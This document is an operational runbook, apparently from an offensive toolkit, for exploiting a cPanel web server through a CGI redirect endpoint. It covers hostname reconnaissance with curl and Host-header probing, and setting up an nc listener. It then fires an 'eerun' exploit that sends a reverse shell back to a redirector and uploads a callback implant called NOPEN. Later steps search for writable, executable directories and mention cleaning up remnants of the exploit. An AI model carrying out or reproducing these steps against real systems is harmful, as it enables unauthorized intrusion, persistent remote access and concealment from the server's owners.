# Give the following a try first, if you see a line that looks like :
#
#  <p>The document has moved <a href="http://somehost.somedomain.com/domainnotknown.html">here</a>.</p>
#
# Then you now have the main hostname for your server, congrats.
#
curl -v APPLICATION_LAYER_PROTOCOL://127.0.0.1:LOCAL_REDIRECTION_PORT/cgi-sys/domainredirect.cgi

#
# To confirm you have to correct IP address, you should run the following.  If
# you get a generic apache page and not an application specific page, it is a
# good bed you are on the main IP address.
#

curl -v APPLICATION_LAYER_PROTOCOL://127.0.0.1:LOCAL_REDIRECTION_PORT/

#
# If needed, check if cpanel is setup to redirect to the main IP
#

curl -v -s --header "Host: cpanel.a.com" APPLICATION_LAYER_PROTOCOL://127.0.0.1:LOCAL_REDIRECTION_PORT/

#
# Or try a nonexistant hostname and see if it redirects you to the main page
#

curl -v -s --header "Host: google-cachebot-07e33p29g.google.com" APPLICATION_LAYER_PROTOCOL://127.0.0.1:LOCAL_REDIRECTION_PORT/

#
# You can also try a reverse DNS lookup on your target (FROM PITCH)
#

nslookup IP_ADDRESS_OF_TARGET

#
# Now let's use the main hostname for the rest of the exploit, if you decide to
# throw the exploit at the base IP address directly, then put in the IP address
# in the replacement line below
#

mx
:%s/TARGET_HOSTNAME/somehost.somedomain.com/g

#
# Ok, let's add the hostname to our /etc/hosts file
#

cat << _EOF_ >> /etc/hosts
127.0.0.1	TARGET_HOSTNAME 
_EOF_

#
# Make sure you know what the options do...
#
./eerun -h -v

#
# And throw the exploit, this is how to get a reverse shell back from the target
#

# get nc ready
nc -l -v -p CALLBACK_PORT

./eerun APPLICATION_LAYER_PROTOCOL://TARGET_HOSTNAME:LOCAL_REDIRECTION_PORT/CGIECHO_URL callback IP_ADDRESS_OF_REDIRECTOR CALLBACK_PORT

#
# And this is how you upload NOPEN and have it call us back

#
# There are other things to do with this exploit, check the documentation to 
# get an idea.
#

#
# Once you are on, you are going to need to find a directory where you have
# write permissions and is mounted executable.  The find commands below should
# help with that:
#

find / -type d -perm -o+rwx 2>/dev/null

cd /tmp
for i in `cat /etc/passwd | cut -d : -f 6`; do find $i/public_html -type d -perm -o+rwx 2>/dev/null; done

# If you still cannot find a directory, try these:
/var/cpanel/rvglobalsoft/rvsitebuilder/www/users
/var/cache/coolkey

#
# Your working directory will currently be /, so go fix that
#

#
# Cleaning:  Check the following locations for remnants of your exploit (plus
# of course a full time sorted find ;-) )
